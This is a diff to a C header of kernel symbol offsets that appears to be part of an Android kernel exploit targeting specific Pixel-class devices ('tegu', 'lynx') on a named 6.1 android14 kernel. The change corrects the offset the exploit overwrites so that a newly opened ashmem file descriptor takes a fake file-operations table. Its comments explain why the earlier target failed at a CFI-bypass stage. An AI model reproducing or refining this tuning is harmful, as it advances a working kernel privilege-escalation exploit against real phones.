@@ -71,12 +71,28 @@
 #define ASHMEM_SHOW_FDINFO_OFF      0x00c39a80ULL
 #define ASHMEM_FOPS_OFF             0x01280b50ULL
 
-// NAMING: this is `misc_fops`, not an "ashmem_misc_fops" — no such symbol
-// exists in any kernel. /dev/ashmem is a misc device, so a freshly opened fd
-// starts on the single shared misc_fops (drivers/char/misc.c), whose .open()
-// looks the driver up by minor and swaps file->f_op to ashmem_fops. The macro
-// keeps its historical name; the symbol it resolves to is misc_fops.
-#define ASHMEM_MISC_FOPS_OFF        0x012215e0ULL
+// &ashmem_miscs[0].fops = ashmem_miscs + offsetof(struct miscdevice, fops)
+// = 0x10. Same value as lynx, which is correct because lynx runs the byte
+// identical kernel (6.1.157-android14-11-gbd23337e42e7-ab14791245) — 93 of
+// the 94 symbol offsets in these two headers already agreed, and this was the
+// only one that did not.
+//
+// It used to resolve to the global misc_fops in drivers/char/misc.c, on the
+// reasoning that a freshly opened misc fd starts there. It does, but only for
+// an instant, and that is the wrong slot to own: misc_open() looks the driver
+// up by minor and then does
+//     new_fops = fops_get(c->fops);   /* c is the miscdevice */
+//     replace_fops(file, new_fops);
+// so what decides the new fd's f_op is the miscdevice's own ->fops field, not
+// the shared misc_fops it transiently had. Overwriting misc_fops is undone by
+// replace_fops() before the fd is ever usable, and misc_fops is const .rodata
+// besides, which is why the old value sat below ASHMEM_FOPS_OFF while this one
+// sits above it in .data.
+//
+// This is what stopped tegu at try_cfi_stage() step 4 on every attempt of both
+// main routes: the overwrite went somewhere harmless, so the read-back never
+// matched fake_fops, and nothing ever crashed to say so.
+#define ASHMEM_MISC_FOPS_OFF        0x0217cb80ULL
 
 // NAMING: kallsyms spells this `compat_ashmem_ioctl`, not
 // `ashmem_compat_ioctl`. Cross-checked against the live ashmem_fops struct
